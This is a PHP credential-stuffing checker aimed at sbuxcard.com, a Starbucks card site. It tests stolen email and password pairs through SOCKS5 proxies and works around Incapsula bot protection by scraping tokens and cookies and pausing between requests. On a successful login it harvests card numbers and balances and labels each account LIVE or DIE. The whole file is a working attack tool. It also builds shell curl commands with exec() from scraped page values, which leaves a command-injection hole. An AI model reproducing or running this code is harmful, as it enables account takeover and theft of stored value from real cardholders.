<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
// function
function getStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }

  return $contents;
}
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$result = array();

if (!isset($format)) {
header('location: ./');
exit;
}

require 'includes/class_curl.php';

if (isset($format)){
	// cek wrong
	if ($pisah[0] == '' || $pisah[0] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
	
	$session = rand(10,999999999);
$kukiname = 'cookies/'.md5($_SERVER['REMOTE_ADDR'].$session.$pisah[0]).'.txt';

// Step 1 Getting TOKET
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.sbuxcard.com/index.php?page=signin");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
curl_setopt($ch, CURLOPT_PROXY, $sock);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$fp = fopen($kukiname,'wb');fclose($fp);
curl_setopt($ch, CURLOPT_COOKIEJAR, $kukiname);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = "Connection: keep-alive";
$headers[] = "Cache-Control: max-age=0";
$headers[] = "Upgrade-Insecure-Requests: 1";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36";
$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
$headers[] = "Accept-Encoding: gzip, deflate, br";
$headers[] = "Accept-Language: en-US,en;q=0.9";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    exec('rm '.$kukiname);
    die('{"error":3,"msg":"<font color=red><b>SOCKS DIE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.$page.'"}');
}
curl_close ($ch);

// Load Cookies
$loadgugi = file_get_contents($kukiname,'wb');


$token = getStr($result, 'token" value="', '"');
$sessid = getStr($loadgugi, 'PHPSESSID	', "\n");
$srvid = getStr($loadgugi, 'SRVID	', "\n");
$visid = getStr($loadgugi, 'visid_incap_1107200	', "\n");
$incap = getStr($loadgugi, 'incap_ses_284_1107200	', "\n");

exec('rm '.$kukiname);

//print($token."\n".$sessid."\n".$srvid."\n".$visid."\n".$incap); //debugging

// Post Fields
$emailln = strlen($pisah[0]);
$passln = strlen($pisah[1]);
$postfields = 'token='.$token.'&Email='.$pisah[0].'&Password='.$pisah[1].'&txtaction=signin&emailcount='.$emailln.'&passcount='.$passln;
$cokicoki = 'Cookie: visid_incap_1107200='.$visid.'; _ga=GA1.2.891933291.1526394790; incap_ses_635_1107200='.$incap.'; PHPSESSID='.$sessid.'; SRVID='.$srvid.'; _gid=GA1.2.531461359.1527096831; _gat=1';
$allcard = ' ';

sleep(1); // Avoiding incapsula

// Step 2 POST Login Fields
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.sbuxcard.com/index.php?page=signin'");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
curl_setopt($ch, CURLOPT_PROXY, $sock);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$fp = fopen($kukiname,'wb');fclose($fp);
curl_setopt($ch, CURLOPT_COOKIEJAR, $kukiname);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headersPOST = array();
$headersPOST[] = "Connection: keep-alive";
$headersPOST[] = "Cache-Control: max-age=0";
$headersPOST[] = "Origin: https://www.sbuxcard.com";
$headersPOST[] = "Upgrade-Insecure-Requests: 1";
$headersPOST[] = "Content-Type: application/x-www-form-urlencoded";
$headersPOST[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36";
$headersPOST[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
$headersPOST[] = "Referer: https://www.sbuxcard.com/index.php?page=signin";
$headersPOST[] = "Accept-Encoding: gzip, deflate, br";
$headersPOST[] = "Accept-Language: en-US,en;q=0.9";
$headersPOST[] = $cokicoki;

curl_setopt($ch, CURLOPT_HTTPHEADER, $headersPOST);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);

$resultlogin = curl_exec($ch);
if (curl_errno($ch)) {
    exec('rm '.$kukiname);
    die('{"error":3,"msg":"<font color=red><b>SOCKS DIE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.$page.'"}');
}
curl_close ($ch);
//print($resultlogin); //debug
if (strpos($resultlogin, "index.php?page=account")!==false){

    // Load Cookies
    $loadgugi = file_get_contents($kukiname,'wb');
    $newsessid = getStr($loadgugi, 'PHPSESSID	', "\n");
    $newincap = getStr($loadgugi, 'incap_ses_284_1107200	', "\n");
    $cock = 'Cookie: visid_incap_1107200='.$visid.'; _ga=GA1.2.891933291.1526394790; SRVID='.$srvid.'; _gid=GA1.2.531461359.1527096831; incap_ses_188_1107200='.$newincap.'; _gat=1; PHPSESSID='.$newsessid;

    exec('rm '.$kukiname);
    
    sleep(1); // Avoiding incapsula

    // Getting info card
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://www.sbuxcard.com/index.php?page=cards");
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    curl_setopt($ch, CURLOPT_PROXY, $sock);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headersCARD = array();
    $headersCARD[] = "Connection: keep-alive";
    $headersCARD[] = "Upgrade-Insecure-Requests: 1";
    $headersCARD[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36";
    $headersCARD[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
    $headersCARD[] = "Referer: https://www.sbuxcard.com/index.php?page=account";
    $headersCARD[] = "Accept-Encoding: gzip, deflate, br";
    $headersCARD[] = "Accept-Language: en-US,en;q=0.9";
    $headersCARD[] = $cock;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headersCARD);

    $resultCARD = curl_exec($ch);
    if (curl_errno($ch)) {
	    die('{"error":3,"msg":"<font color=red><b>SOCKS DIE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.$page.'"}');
    }
    curl_close ($ch);

    $totalcard = getStr($resultCARD, '<h2 class="mc-title">My Card(s) | ', '</h2>');
    $cardlist = getContents($resultCARD, '<div id="ey', '" class="card');
    $counter = count($cardlist);
    $ajax = getStr($resultCARD, '"ajax=', '&');
    for($i = 0; $i < $counter; $i++){
        $data = 'ey'.$cardlist[$i];
        exec("curl -c s_cookie.tmp 'https://www.sbuxcard.com/ajaxController.php?ajax={$ajax}&data={$data}&_=1527158116120' -H 'Cookie: visid_incap_1107200={$visid}; _ga=GA1.2.891933291.1526394790; _gid=GA1.2.531461359.1527096831; SRVID={$srvid}; incap_ses_188_1107200={$newincap}; PHPSESSID={$newsessid}; _gat=1' -H 'X-NewRelic-ID: UQcHU15WGwcHV1JXDgU=' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: */*' -H 'Referer: https://www.sbuxcard.com/index.php?page=cards' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --compressed -D - -s -o ".$kukiname);
        
        $resultAJAX = file_get_contents($kukiname,'wb');
        exec('rm '.$kukiname);
        if(strpos($resultAJAX, 'Deactive') == true){
            $cnum = getStr($resultAJAX, '<strong>Card Number</strong></td><td>: ', '</td></tr>');
            $allcard .= "[ <font color=#4A235A><b>".$cnum."</b></font> - "."<font color=red><b>Deactive</b></font> ] ";
        } else if(strpos($resultAJAX, 'Deactive') == false){
            $cnum = getStr($resultAJAX, '<strong>Card Number</strong></td><td>: ', '</td></tr>');
            $cbal = getContents($resultAJAX, '<font color="#009933">', '</font>');
            if(count($cbal)==1) {
                $cbals = getStr($resultAJAX, '<font color="#FF0000"> ', '</font>');
                $allcard .= "[ <font color=#4A235A><b>".$cnum."</b></font> - "."<b>IDR <font color=red>".$cbals."</font></b> ] ";
            } else if(count($cbal==2)){
                $allcard .= "[ <font color=#4A235A><b>".$cnum."</b></font> - "."<b>IDR <font color=blue>".$cbal[1]."</font></b> ] ";
            }
        } else if(strpos($resultAJAX, 'src="/_Incapsula_Resource?')!==false) {
	        die('{"error":3,"msg":"<font color=red><b>CAPTCHA DETECTED</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].'"}');
        }
    }
    
    //print("LIVE | ".$email." | ".$pass."| My Card(s) ".$totalcard." | ".$allcard." Checked on ./teacher-c0de\n");
	//die("<font color=green><b>LIVE</b></font> | ".$sock.' | '.$email.' | '.$pass.' | My Card(s) '.$totalcard.' | '.$allcard);
	die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | My Card(s) <b>'.count($cardlist).'</b> | '.$allcard.' | '.$signature.'"}');
	//sleep(120);
} else if(strpos($resultlogin, 'src="/_Incapsula_Resource?')!==false) {
    exec('rm '.$kukiname);
	die('{"error":3,"msg":"<font color=red><b>CAPTCHA DETECTED</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].'"}');
	$debugging = @fopen('debug.txt', "wb");
	fwrite($debugging, $resultlogin);
	fclose($debugging);
	//sleep(30);
} else {
    exec('rm '.$kukiname);
	die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].'"}');
	$debugging = @fopen('debug.txt', "wb");
	fwrite($debugging, $resultlogin);
	fclose($debugging);
}
} else {
	die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
}
?>